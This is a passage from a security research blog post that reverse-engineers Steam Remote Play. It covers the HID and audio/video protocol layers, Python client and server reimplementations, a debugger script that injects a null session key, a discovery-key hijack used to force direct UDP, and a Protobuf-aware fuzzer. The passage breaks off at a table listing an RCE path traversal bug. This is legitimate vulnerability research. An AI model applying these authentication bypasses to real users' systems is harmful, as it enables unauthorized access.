</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceWrite device_write<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceRead device_read<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceSendFeatureReport device_send_feature_report<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceGetFeatureReport device_get_feature_report<span style=color:#f92672>=</span><span style=color:#ae81ff>7</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceGetVendorString device_get_vendor_string<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceGetProductString device_get_product_string<span style=color:#f92672>=</span><span style=color:#ae81ff>9</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceGetSerialNumberString device_get_serial_number_string<span style=color:#f92672>=</span><span style=color:#ae81ff>10</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceStartInputReports device_start_input_reports<span style=color:#f92672>=</span><span style=color:#ae81ff>11</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceRequestFullReport device_request_full_report<span style=color:#f92672>=</span><span style=color:#ae81ff>12</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageToRemote.DeviceDisconnect device_disconnect<span style=color:#f92672>=</span><span style=color:#ae81ff>13</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> }<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>We understand that remote HID is a whole sub-protocol. The <code>request_id</code> field tags messages in order to keep track of which request the server responds to. Then, one of the 12 sub-message types is nested. These allow to open a client device, read from it, write to it, and obtain various metadata.</p><p>The actions that are performed and the data that is sent back obviously depend on the type of plugged-in device, hence why the list of commands is actually an interface for which there exist multiple implementations:</p><table><thead><tr><th>Implementation</th><th>Can be triggered via&mldr;</th></tr></thead><tbody><tr><td><code>CVirtualController</code></td><td>Virtual touch device in the client settings</td></tr><tr><td><code>CHIDDeviceSDLGamepad</code></td><td>USB controller, handled by SDL</td></tr><tr><td><code>CHIDDeviceSDLJoystick</code></td><td>USB joystick, handled by SDL</td></tr><tr><td><code>CHIDDeviceLocal</code></td><td>Manually opening device via SDL API or raw IOCTL (fallback)</td></tr></tbody></table><p>In terms of attack surfaces, only the first three implementations are of interest, as the local device one is entirely device-specific (no client logic).</p><p>The caveat is that since each implementation is specific to a type of device, it is harder to look for bugs without owning or emulating them, and bugs themselves can highly depend on the client device which is not under control of the attacker.</p><p>As for the messages that the client can send to the server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>oneof</span> command {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageFromRemote.UpdateDeviceList update_device_list <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageFromRemote.RequestResponse response <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageFromRemote.DeviceInputReports reports <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageFromRemote.CloseDevice close_device <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  <span style=color:#f92672>.</span>CHIDMessageFromRemote.CloseAllDevices close_all_devices <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>The client can announce its list of available devices (gamepad, joysticks&mldr;) through the <code>UpdateDeviceList</code> message. They can also answer a read request or a feature report request with specific data.</p><p>Remote HID is therefore a tempting attack surface: it adds 17 new message types in total, and as their purpose is to interface with devices, they operate at a slightly lower level.</p><h2 id=audiovideo-data>Audio/video data</h2><p>In data channels, the sub-handling logic primarily depends on the codec that was selected by the channel opener. The following tree diagram shows the different codecs and formats that are implemented in Remote Play.</p><p><a href=/posts/img/remoteplay/audio-video-codecs.png target=_blank><img src=/posts/img/remoteplay/audio-video-codecs.png alt="Audio and video codecs in Remote Play"></a></p><p>The most interesting codecs are the raw ones, because they implement custom logic, unlike other codecs that usually leverage third-party libraries (e.g. libopus).</p><p>It is also worth noting most codecs actually do not implement encryption (which is rather odd since audio or video communications can carry sensitive data; although it is not that much of a security issue in a remote SDR/WebRTC context backed by underlying encryption layers).</p><p>Data packets embed a whole new layer of data, encapsulated within an additional header. Although all the fields were not clearly figured out, the following information is enough to, as a server, be able to send audio or video data that the client understands and renders:</p><table><thead><tr><th style=text-align:left>Field</th><th style=text-align:center>Size (bytes)</th></tr></thead><tbody><tr><td style=text-align:left>Data message type</td><td style=text-align:center>1</td></tr><tr><td style=text-align:left>Sequence number 1</td><td style=text-align:center>2</td></tr><tr><td style=text-align:left>Timestamp</td><td style=text-align:center>4</td></tr><tr><td style=text-align:left>Unknown</td><td style=text-align:center>6</td></tr><tr><td style=text-align:left>Sequence number 2</td><td style=text-align:center>2</td></tr><tr><td style=text-align:left>Flags</td><td style=text-align:center>1</td></tr><tr><td style=text-align:left>Unknown</td><td style=text-align:center>4</td></tr></tbody></table><p>Timestamps have to be non-null and increasing. Some observations showed that the unknown fields were always null and that the sequence number fields were usually equal, except for audio data where the second one is null.</p><p>It also appears that for some reason, the three last fields were at times not present in certain codecs, like the <em>raw</em> video one.</p><p>This new knowledge allows to trigger new paths in the binary related to decoding audio and video data for each codec/format. These are an interesting surface because such functions may be more prone to memory corruption bugs.</p><h1 id=implementing-a-custom-client-and-server>Implementing a custom client and server</h1><p>This section explains how a client and a server for the Remote Play protocol were reimplemented in Python. Their first purpose was to easily play around with the protocol and send custom messages manually. These implementations eventually grew into an <em>ad hoc</em> fuzzer, which next section will be dedicated to.</p><h2 id=choice-of-transport-mode>Choice of transport mode</h2><p>We briefly mentioned earlier that Remote Play implements several modes of transport, given by the <code>EStreamTransport</code> enum. Some examples are UDP, relay UDP, WebRTC and SDR (<a href=https://partner.steamgames.com/doc/features/multiplayer/steamdatagramrelay>Steam Datagram Relays</a>).</p><p>A few tests showed that the preferred network transport mode that was automatically used by the Remote Play client and server in Steam was SDR relaying. However, the most simple transport mode is direct UDP (<code>k_EStreamTransportUDP</code>), for clients and hosts that can communicate directly without need for a peer-to-peer setup or relays.</p><p>Using direct UDP allows to focus on the Remote Play protocol itself by circumventing any potential SDR or WebRTC abstraction, making it much easier to carry out tests and develop a custom client or server implementation that works locally.</p><h2 id=server-reimplementation>Server reimplementation</h2><p>Reimplementing a server for the Remote Play protocol allowed to interface with the official streaming client in Steam. The latter can be started from the command line by specifying the transport mode (UDP) along with the server&rsquo;s IP address and port.</p><pre tabindex=0><code>&#34;C:\Program Files (x86)\Steam\streaming_client.exe&#34; --windowed --steamid 123 --gameid 456 --appid 789 --server 1.2.3.4:31337 --transport k_EStreamTransportUDP
</code></pre><p>However, there&rsquo;s a catch. By running this binary directly, we have somewhat bypassed the key exchange scheme and once we get to the <em>Authenticating</em> state, the client cannot find any session key to load.</p><p>To address this issue, we can look for the first time in the client where the session key is supposed to be used: the <code>CStreamClient::StartAuthentication</code> method. Indeed, in this state, the client needs to calculate an HMAC using the session key to authenticate to the host:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__fastcall</span> CStreamClient<span style=color:#f92672>::</span>StartAuthentication(CStreamClient <span style=color:#f92672>*</span><span style=color:#66d9ef>this</span>) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    CAuthenticationRequestMsg Msg; <span style=color:#75715e>// [sp+8h] [bp-58h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    _BYTE hmac[<span style=color:#ae81ff>32</span>]; <span style=color:#75715e>// [sp+34h] [bp-2Ch] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    CStreamClient<span style=color:#f92672>::</span>SetSessionState(<span style=color:#66d9ef>this</span>, AUTHENTICATING);
</span></span><span style=display:flex><span>    CAuthenticationRequestMsg<span style=color:#f92672>::</span>CAuthenticationRequestMsg(Msg);
</span></span><span style=display:flex><span>    CCrypto<span style=color:#f92672>::</span>GenerateHMAC256(
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;Steam In-Home Streaming&#34;</span>,
</span></span><span style=display:flex><span>      strlen(<span style=color:#e6db74>&#34;Steam In-Home Streaming&#34;</span>),
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>Key,
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>KeySize,
</span></span><span style=display:flex><span>      hmac
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>    CAuthenticationRequestMsg<span style=color:#f92672>::</span>set_token(Msg, hmac, <span style=color:#ae81ff>0x20</span>);
</span></span><span style=display:flex><span>    CStreamClient<span style=color:#f92672>::</span>SendControlMessage(
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>this</span>,
</span></span><span style=display:flex><span>      k_EStreamControlAuthenticationRequest,
</span></span><span style=display:flex><span>      Msg
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>    CAuthenticationRequestMsg<span style=color:#f92672>::~</span>CAuthenticationRequestMsg(Msg);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>At this point in time, just before <code>CCrypto::GenerateHMAC256</code> is called, we can inject our own session key in the <code>CStreamClient</code> structure. To this purpose, a small <a href=https://help.x64dbg.com/en/latest/commands/script/>x32dbg script</a> was written to run the client with, that injects a 32-byte null key. This may be achieved through many other techniques (patching, DLL injection&mldr;).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=display:flex><span>erun
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Reach CStreamClient::StartAuthentication, just before the call
</span></span></span><span style=display:flex><span><span style=color:#75715e>// to CCrypto::GenerateHMAC256. Offset will depend on Steam version.
</span></span></span><span style=display:flex><span><span style=color:#75715e>// ebx needs to point the CStreamClient structure.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>bp streaming_client<span style=color:#f92672>:</span>$10D9E5
</span></span><span style=display:flex><span>erun
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// New key (full null bytes)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>alloc <span style=color:#ae81ff>32</span>
</span></span><span style=display:flex><span>$key <span style=color:#f92672>=</span> $result
</span></span><span style=display:flex><span>fill $key<span style=color:#f92672>,</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>32</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Copy new key addr
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>mov dword<span style=color:#f92672>:[</span>ebx <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x24</span><span style=color:#f92672>],</span> $key
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Copy key size (0x20)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>set <span style=color:#f92672>(</span>ebx <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x34</span><span style=color:#f92672>),</span> <span style=color:#960050;background-color:#1e0010>#</span><span style=color:#ae81ff>20</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#960050;background-color:#1e0010>#</span> 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Resume execution
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>erun
</span></span></code></pre></div><p>Once this issue has been addressed, the whole protocol can be reimplemented by leveraging the Protobuf definitions at disposal. It requires going through the connection phase and implementing a few basic messages (such as <em>Keep Alive</em>), before being able to send custom control messages to the client.</p><h2 id=client-reimplementation>Client reimplementation</h2><p>In order to target the server implementation, reimplementing a client required a little bit more work.</p><p>Setting up a Remote Play server directly through the invite mechanism that you can find in the Steam overlay when you are playing a game makes developing a client quite difficult, as the session will naturally be built over SDR or WebRTC.</p><p>There is, however, a way to circumvent this issue: forcing a direct UDP connection by <em>hijacking a local Steam Link key</em>.</p><p>Steam Link uses a separate protocol, called the <em>Steam In-Home Streaming Discovery Protocol</em>, for clients to discover devices that are available for streaming on a local network (or remotely with a PIN code system).</p><p>If Steam is launched and you have checked <em>Enable Remote Play</em> in the settings, you should be able to see your own machine appear.</p><p><a href=/posts/img/remoteplay/steamlink.jpg target=_blank><img src=/posts/img/remoteplay/steamlink.jpg alt="Steam Link discovered a machine"></a></p><p>Connecting to the machine then lands you inside your Steam library (through the Steam Big Picture UI).</p><p>What&rsquo;s nice about the Discovery protocol, whose protobuf definitions are found in the <a href=https://github.com/SteamDatabase/Protobufs/blob/master/steam/steammessages_remoteclient_discovery.proto><code>steammessages_remoteclient_discovery.proto</code></a> definition file, is that a client can specify a list of supported modes of transport inside the <code>CMsgRemoteDeviceStreamingRequest</code> message.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>message</span> <span style=color:#a6e22e>CMsgRemoteDeviceStreamingRequest</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>message</span> <span style=color:#a6e22e>ReservedGamepad</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> controller_type <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> controller_subtype <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	}<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>required</span> <span style=color:#66d9ef>uint32</span> request_id <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>int32</span> maximum_resolution_x <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>int32</span> maximum_resolution_y <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>int32</span> audio_channel_count <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span> [<span style=color:#66d9ef>default</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>];<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> device_version <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> stream_desktop <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bytes</span> device_token <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bytes</span> pin <span style=color:#f92672>=</span> <span style=color:#ae81ff>8</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> enable_video_streaming <span style=color:#f92672>=</span> <span style=color:#ae81ff>9</span> [<span style=color:#66d9ef>default</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>];<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> enable_audio_streaming <span style=color:#f92672>=</span> <span style=color:#ae81ff>10</span> [<span style=color:#66d9ef>default</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>];<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> enable_input_streaming <span style=color:#f92672>=</span> <span style=color:#ae81ff>11</span> [<span style=color:#66d9ef>default</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>];<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> network_test <span style=color:#f92672>=</span> <span style=color:#ae81ff>12</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint64</span> client_id <span style=color:#f92672>=</span> <span style=color:#ae81ff>13</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>repeated</span> <span style=color:#f92672>.</span>EStreamTransport supported_transport <span style=color:#f92672>=</span> <span style=color:#ae81ff>14</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> restricted <span style=color:#f92672>=</span> <span style=color:#ae81ff>15</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#f92672>.</span>EStreamDeviceFormFactor form_factor <span style=color:#f92672>=</span> <span style=color:#ae81ff>16</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>int32</span> gamepad_count <span style=color:#f92672>=</span> <span style=color:#ae81ff>17</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>repeated</span> <span style=color:#f92672>.</span>CMsgRemoteDeviceStreamingRequest.ReservedGamepad gamepads <span style=color:#f92672>=</span> <span style=color:#ae81ff>18</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint64</span> gameid <span style=color:#f92672>=</span> <span style=color:#ae81ff>19</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#f92672>.</span>EStreamInterface stream_interface <span style=color:#f92672>=</span> <span style=color:#ae81ff>20</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>This way, one can ensure the connection will use direct UDP.</p><p>We will not go to the extent of detailing the whole discovery protocol in this post, but it needed to be reversed and reimplemented to be authenticated on a local Steam instance.</p><p>Indeed, when you discover and connect to a machine, your device gets <em>paired</em> to it by being assigned a <em>client ID</em> and by sharing a <em>discovery key</em>.</p><p><a href=/posts/img/remoteplay/steamlink-pair.png target=_blank><img src=/posts/img/remoteplay/steamlink-pair.png alt="Steam Link pairing"></a></p><p>It is possible to borrow a discovery key (this can be performed only once, for example through debugging) and reuse it by plugging it inside the discovery protocol to go through.</p><p>The server eventually answers a <em>Device Streaming Response</em> that contains the port to connect to for the Remote Play session, as well as a randomly generated session key that can be decrypted using the client discovery key.</p><p>The rest of the client implementation process is quite similar to the server one.</p><h1 id=implementing-a-dedicated-fuzzer>Implementing a dedicated fuzzer</h1><h2 id=rpfuzz-a-fuzzer-for-the-remote-play-protocol><code>rpfuzz</code>: a fuzzer for the Remote Play protocol</h2><p>The client and server reimplementations that were developed and detailed in the previous section were extensively used to play around with the protocol, and naturally evolved into a basic fuzzer, which was given the very unconventional name <code>rpfuzz</code> (for <em>remote play fuzzer</em>).</p><p>The idea was to keep on playing around with the protocol by writing a little fuzzer from scratch on top of the existing code, to see if we could stumble upon &ldquo;quick wins&rdquo; by randomly mutating Protobuf messages.</p><p>The following diagram describes <code>rpfuzz</code>&rsquo;s software architecture.</p><p><a href=/posts/img/remoteplay/rpfuzz.png target=_blank><img src=/posts/img/remoteplay/rpfuzz.png alt="<code>rpfuzz</code> architecture"></a></p><p>The <strong>network component</strong> (orange block) is interchangeable: depending on the target, it can be replace by a server implementation, or by a client implementation (coupled with the discovery protocol). It is in charge of communicating with the target.</p><p>The <strong>Fuzzer</strong> component runs on a separate thread. It supports both control messages and audio/video channels.</p><p>Control message fuzzing is essentially stateless. It consists of a loop that randomly chooses a message type and passes on the associated protobuf class over to a mutation engine: <code>pbfuzz</code>, which will be covered more in depth later. <code>pbfuzz</code> sends back a Python object to generate an endless amount of mutations, which are assembled into messages and then sent to the target through the network implementation.</p><p>On the other hand, fuzzing remote HID messages requires stateful actions, such as sending a request to open a device. In the same way, fuzzing audio/video channels requires opening a new dynamic channel.</p><p>A few other nice features were implemented, namely a replay system, a scenario system and a logging system.</p><p>The <strong>Logger</strong> basically just saves all the sent mutations to a file for a fuzzing session. It helps keeping a fuzzing history. This is useful for debugging and analyzing crashes.</p><p>These logs can also be fed back to the <strong>Replay System</strong>, which will replay all the messages from a session one at a time. This can prove useful to try and reproduce a (deterministic enough) crash, by hopefully bringing the target to a state that has already been reached before.</p><p>Finally, a <strong>Scenario System</strong> was designed to write specific scenarios and play them at any time. It was especially useful to reproduce bugs and write proofs of concept. Besides, each bug scenario can specify a condition that should be necessarily verified by messages that trigger the associated bug. Thanks to this, the fuzzer knows when to avoid specific messages, and is not slowed down by already-found crashes.</p><h2 id=pbfuzz-a-custom-protobuf-mutation-engine><code>pbfuzz</code>: a custom Protobuf mutation engine</h2><p><code>pbfuzz</code> is — you guessed it — another unconventional name standing for <em>protobuf fuzzer</em>.</p><p>One of the challenges usually brought by fuzzing stateful network protocols is that of <em>grammatical awareness</em>. In our case, existing mutational engines inside fuzzing frameworks can definitely not be adopted out-of-the-box, as they would break the message&rsquo;s structures. Even worse, they would totally disfigure all Protobuf serialized data, hence the need for a Protobuf-aware mutational engine.</p><p>The choice was made to write a custom Protobuf mutation engine from scratch for more flexibility, better integration and educational purposes. Other contenders for this component include <a href=https://github.com/google/libprotobuf-mutator>libprotobuf-mutator</a>, which was not invesitgated and could constitute a valid alternative, and <a href=https://github.com/trailofbits/protofuzz>ProtoFuzz</a>, a Python library that ended up lacking flexibility for our use case, and in which there were too many bugs (such as broken support of repeated fields).</p><p>At its core, <code>pbfuzz</code> relies on playing with inner objects and attributes of Google&rsquo;s protobuf module, in order to walk through message descriptors, types, labels. Although the fuzzer is model-based and does not require input seeds (the Protobuf definitions are known in advance), several mutation strategies were implemented for each field type, taking inspiration from traditional model-less mutation engines.</p><p>Strings and bytes fields can undergo bit flips, byte substitutions, trimming, or insertion of random or &ldquo;interesting&rdquo; data like string formatters (<code>%x</code>, <code>%s</code>, <code>%n</code>), paths, URLs, XML, JSON&mldr; of random length. These could trigger buffer overflows, format string vulnerabilities, logic bugs, or other kinds of more higher-level bugs.</p><p>Integer fields (and floats) are also mutated with interesting values, depending on bit size (32, 64) and signedness, opening up for integer overflows or out-of-bounds accesses.</p><p>Repeated fields (lists) can go through single mutations (only one element of the list is mutated), random trims or random insertions of random lengths. Nested message fields are mutated recursively as well.</p><p>Finally, fields marked as optional can also be deliberately omitted at random: indeed, a program could try accessing fields from a deserialized object without verifying whether they are actually present, leading to potentially unexpected behavior.</p><h2 id=fuzzing-results-and-crash-analysis>Fuzzing results and crash analysis</h2><p>The fuzzing speed was limited by the target&rsquo;s packet processing speed; in other words, the target acted as a bottleneck and the fuzzing speed had to be adjusted manually not to cause an overload. Still, the fuzzer was able to send 100 to 1000 messages per second without overworking the target too much.</p><p>In terms of surface, all the control messages were successfully reached, with a few exceptions being obsolete or unimplemented message types. Audio/video codecs were also all reached, except for the raw accelerated graphics format and the HEVC codec, which channels could not be opened for some reason.</p><p>The fuzzer could benefit from multiple improvements: for instance, it does not feature any dynamic instrumentation ability or code coverage, and it is not able to synchronize with the target either. But even though <code>rpfuzz</code> is rather naive and black-box driven, it proved to be largely sufficient to uncover several bugs, as discussed in the next section.</p><p><code>pbfuzz</code> also comes with its own set of limitations. Namely: it only supports Protobuf 2, does not implement some concepts (like unions, maps or extensions that are practically non-existent in Remote Play), and could also feature better string mutators. However, it is rather efficient and malleable, and could be reused to fuzz other targets that feature Protobuf communications.</p><p>In order to monitor crashes, a simple way was to attach a debugger to the target in order to intercept crashes and analyze them. <a href=https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-and-pageheap>PageHeap</a> was also enabled, which is a must-have to keep track of any out-of-bounds access in the heap.</p><p><a href=https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/time-travel-debugging-overview>Time Travel Debugging</a> is also another nice tool to have in the toolbox to analyze certain crashes or bigger schemes that involve more convoluted control flows. More specifically, the <a href=https://github.com/airbus-cert/ttddbg>ttddbg</a> plugin for IDA is neat: it supports loading a TTD trace and debugging it.</p><h1 id=vulnerabilities>Vulnerabilities</h1><p>A couple dozen of bugs were identified thanks to <code>rpfuzz</code>. They affect Remote Play in the Steam client, and also the Steam Link product. They should be replicable on other platforms (Linux, Android, iOS), although it was not verified for all of them.</p><p>A lot of these bugs are unexploitable and/or uninteresting, therefore in this post we will go through a couple of the more technically interesting ones in more detail.</p><p>The vulnerabilities that were found all target the client implementation, although a few minor bugs were also found in the server implementation.</p><table><thead><tr><th style=text-align:left>Description</th><th style=text-align:left>Impact</th></tr></thead><tbody><tr><td style=text-align:left><code>CSetTouchIconDataMsg</code> path traversal file write</td><td style=text-align:left>Remote code execution</td></tr><tr><td 